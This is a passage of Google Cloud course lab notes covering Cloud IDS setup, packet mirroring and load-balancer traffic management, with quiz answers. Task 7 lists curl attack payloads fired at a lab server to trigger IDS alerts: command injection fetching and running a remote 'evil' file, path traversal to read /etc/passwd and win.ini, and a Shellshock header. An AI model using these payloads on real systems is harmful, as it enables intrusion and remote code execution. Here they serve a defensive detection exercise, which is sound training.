1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud ids endpoints list --project=$PROJECT_ID | grep STATE</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  STATE: READY</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Continue to run this command every few minutes until the state shows </span><em><span>READY</span></em><span>.</span></p><ol start='' ><li><p><span>Identify the Cloud IDS endpoint forwarding rule and confirm that the Cloud IDS endpoint state is </span><em><span>READY</span></em><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">export FORWARDING_RULE=$(gcloud ids endpoints describe cloud-ids-east1 --zone=us-east1-b --format="value(endpointForwardingRule)")</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $FORWARDING_RULE</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p>&nbsp;</p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  https://www.googleapis.com/compute/v1/projects/md975a7fa0a53145dp-tp/regions/us-east1/forwardingRules/ids-fr-cloud--xkkerutlagop6opm &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Create and attach the packet mirroring policy:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute packet-mirrorings create cloud-ids-packet-mirroring \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-east1 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--collector-ilb=$FORWARDING_RULE \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=cloud-ids \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--mirrored-subnets=cloud-ids-useast1</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p>&nbsp;</p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create and attach the packet mirroring policy.</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Verify that the packet mirroring policy is created:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute packet-mirrorings list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><span>This gcloud command lists the packet mirroring policies and shows whether they are enabled/disabled.</span></p><p><span>The output should be similar to this:</span></p><p><span>Command Output</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NAME: cloud-ids-packet-mirroring</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  REGION: us-east1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  NETWORK: cloud-ids</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ENABLE: TRUE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><h4 id='task-7-simulate-attack-traffic'><span>Task 7. Simulate attack traffic</span></h4><p><span>In this task, you establish an SSH connection to your attacked virtual machine and simulate attack traffic from a virtual machine to your server. You do this by running a selection of </span><code>curl</code><span> commands that range from low severity to critical severity.</span></p><ol start='' ><li><p><span>To establish an SSH connection to your attacker virtual machine through IAP, in Cloud Shell, run the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Note:</span></strong><span> You are now in the shell of your attacker VM and not the Cloud Shell machine.</span></p><ol start='' ><li><p><span>Run the following </span><code>curl</code><span> requests in sequence to simulate low, medium, high, and critical severity alerts on the IDS:</span></p></li></ol><p><strong><span>Low Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Medium Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://192.168.10.20/?item=../../../../WINNT/win.ini</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://192.168.10.20/eicar.file</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>High Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><p><strong><span>Critical Severity:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><ol start='' ><li><p><span>Exit the attacker virtual machine shell and return to Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">exit</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p>&nbsp;</p><h4 id='task-8-review-threats-detected-by-cloud-ids'><span>Task 8. Review threats detected by Cloud IDS</span></h4><p><span>In this task, you review the various attack traffic captured by the Cloud IDS in the Cloud console. The captured attack traffic profiles provide details of each threat.</span></p><ol start='' ><li><p><span>In the Google Cloud console, in the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu"><span>), click </span><strong><span>Network Security &gt; Cloud IDS</span></strong><span>.</span></p></li><li><p><span>Click the </span><strong><span>Threats</span></strong><span> tab.</span></p></li></ol><p><span>The Cloud IDS captured various attack traffic profiles and provided the details on each threat. You may need to click </span><strong><span>Refresh</span></strong><span> if you do not see any threats. You now dive a little deeper and view threat details.</span></p><ol start='' ><li><p><span>Locate the </span><strong><span>Bash Remote Code Execution Vulnerability</span></strong><span> threat, click </span><strong><span>More</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/2ufrDePg5inKfodUoT2Kib4oE7II7emYn%2BypCC85FjQ%3D" referrerpolicy="no-referrer" alt="More Button"><span>), and then select </span><strong><span>View threat details</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You may have noticed that there are multiple threats that produce the same name, for example, “Bash Remote Code Execution Vulnerability”. This is expected behavior.</span></p><p>&nbsp;</p><p><span>If you look closely, you will see that the session IDs of the threats are different. Since both VMs created are in the same subnet, we are seeing mirrored packets for both the client and server. Outbound packets from the client are being mirrored to IDS, and additionally, inbound packets to the server are being mirrored to IDS.</span></p><ol start='' ><li><p><span>Now you view the details of this incident in Cloud Logging. To return to the </span><strong><span>Threats</span></strong><span> page, click the left arrow.</span></p></li><li><p><span>Click the </span><strong><span>Threats</span></strong><span> tab.</span></p></li><li><p><span>Locate the </span><strong><span>Bash Remote Code Execution Vulnerability</span></strong><span>, click </span><strong><span>More</span></strong><span>, and then select </span><strong><span>View threat logs</span></strong><span>.</span></p></li></ol><p><span>A new Cloud Logging tab opens that displays the same details. This enables you to send the logs to Cloud Storage, Chronicle, or any SIEM/SOAR. You can also create custom workflows to take remediation action based on alerts, like creating a Cloud Function that triggers on an alert and creating or updating a firewall rule to block the IP address, or creating or updating a Google Cloud Armor policy.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Getting Started with Cloud IDS.</span></p><p>&nbsp;</p><h4 id='congratulations-5'><span>Congratulations!</span></h4><p><span>In this lab, you did the following:</span></p><ol start='' ><li><p><span>Created a new VPC and deployed a Cloud IDS endpoint.</span></p></li><li><p><span>Deployed two VMs, created a packet mirroring policy, and then sent attack traffic.</span></p></li><li><p><span>Verified that the Cloud IDS captured the threats by viewing the threat details in the Cloud console and the threat logs in Cloud Logging.</span></p></li></ol><p>&nbsp;</p><h3 id='quiz-9'><span>Quiz</span></h3><ol start='' ><li><p><span>Which type of IAM member belongs to an application or virtual machine instead of an individual end user?</span></p></li></ol><ul><li><p><span>Cloud Identity domain</span></p></li><li><p><span>Google account</span></p></li><li><p><span>Google group</span></p></li><li><p><strong><span>Service account</span></strong></p></li></ul><p><span>Correct! A service account is a special Google account that belongs to  your application or a virtual machine, instead of to an individual end  user.</span></p><ol start='2' ><li><p><span>Which IAM role contains permissions to create, modify, and delete networking resources, except for firewall rules and SSL certificates?</span></p></li></ol><ul><li><p><span>Network viewer</span></p></li><li><p><span>Security viewer</span></p></li><li><p><span>Security administrator</span></p></li><li><p><strong><span>Network administrator</span></strong></p></li></ul><p><span>Correct! The network administrator role grants permission to create,  modify, and delete networking resources, except for firewall rules and  SSL certificates.</span></p><p>&nbsp;</p><h2 id='advanced-security-monitoring-and-analysis'><span>Advanced Security Monitoring and Analysis</span></h2><h3 id='quiz-10'><span>Quiz</span></h3><ol start='' ><li><p><span>What is the primary purpose of Packet Mirroring in network security?</span></p></li></ol><ul><li><p><span>To filter out unwanted traffic from a network.</span></p></li><li><p><span>To encrypt network traffic for privacy.</span></p></li><li><p><strong><span>To create a duplicate copy of network traffic for analysis.</span></strong></p></li><li><p><span>To redirect traffic to a different network interface.</span></p></li></ul><p><span>Correct! This is the core function of Packet Mirroring, enabling deep analysis of network data.</span></p><ol start='2' ><li><p><span>Which of the following is a key benefit of using Packet Mirroring for network security analysis?</span></p></li></ol><ul><li><p><strong><span>It enables the capture and inspection of traffic without impacting network performance.</span></strong></p></li><li><p><span>It directly prevents cyberattacks.</span></p></li><li><p><span>It automatically patches vulnerabilities in software.</span></p></li><li><p><span>It reduces network bandwidth usage.</span></p></li></ul><p><span>Correct. This is the primary benefit of packet mirroring. It allows  security tools to analyze network traffic without interfering with the  actual flow of data.</span></p><p>&nbsp;</p><p>&nbsp;</p><h1 id='07-networking-in-google-cloud-load-balancing'><span>07 Networking in Google Cloud: Load Balancing</span></h1><h2 id='hybrid-load-balancing-and-traffic-management'><span>Hybrid Load Balancing and Traffic Management</span></h2><h3 id='lab---configuring-traffic-management-with-a-load-balancer'><span>LAB - Configuring Traffic Management with a Load Balancer</span></h3><h4 id='overview-6'><span>Overview</span></h4><p><span>Google Cloud load balancers offer traffic management capabilities that vary by load balancer.</span></p><p><span>In this lab, you create a regional internal Application Load Balancer with two backends. Each backend will be an instance group. You will configure the load balancer to create a blue-green deployment.</span></p><p><span>The blue deployment refers to the current version of your application, and the green deployment refers to a new application version. You configure the load balancer to send 70% of the traffic to the blue deployment and 30% to the green deployment. When you’re finished, the environment will look like this:</span></p><p><img src="https://cdn.qwiklabs.com/FgrZkcSEqghVxKV14KPVgNzTUMo0lQfmqTgpG45%2BTYA%3D" referrerpolicy="no-referrer" alt="The image shows a VPC network with two subnets, each with a managed instance group. One subnet is used for the blue deployment, and the other is used for the green deploynment. Client traffic to the subnets is handled by the load balancer."></p><h4 id='objectives-5'><span>Objectives</span></h4><p><span>In this lab, you perform the following tasks:</span></p><ul><li><p><span>View the Google Cloud infrastructure that the load balancer will use.</span></p></li><li><p><span>Create a regional internal Application Load Balancer with two backends.</span></p></li><li><p><span>Implement traffic management on the load balancer.</span></p></li><li><p><span>Test the load balancer.</span></p></li></ul><h4 id='setup-2'><span>Setup</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no 